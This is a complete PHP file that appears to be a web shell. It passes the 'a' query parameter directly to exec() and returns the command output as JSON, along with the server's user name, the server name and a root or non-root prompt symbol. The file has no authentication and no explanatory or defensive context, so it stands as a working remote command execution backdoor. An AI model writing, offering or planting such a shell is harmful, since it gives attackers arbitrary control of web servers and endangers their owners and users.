<?php
	if(!empty($_GET['a'])){
		$command = exec($_GET['a']);
	}
	if(empty($command)){
		$command = "command not found: ".$_GET['a'];
	}
	
	if(exec("whoami") == "root"){
		$user_bash = "#";
	}else{
		$user_bash = "$";
	}
	
$json = array("server_info" => array("user"=>exec("whoami"),"server_name" => $_SERVER['SERVER_NAME']),
			  "command" => $command,
			  "user_bash" => $user_bash);
				
echo json_encode($json);
?>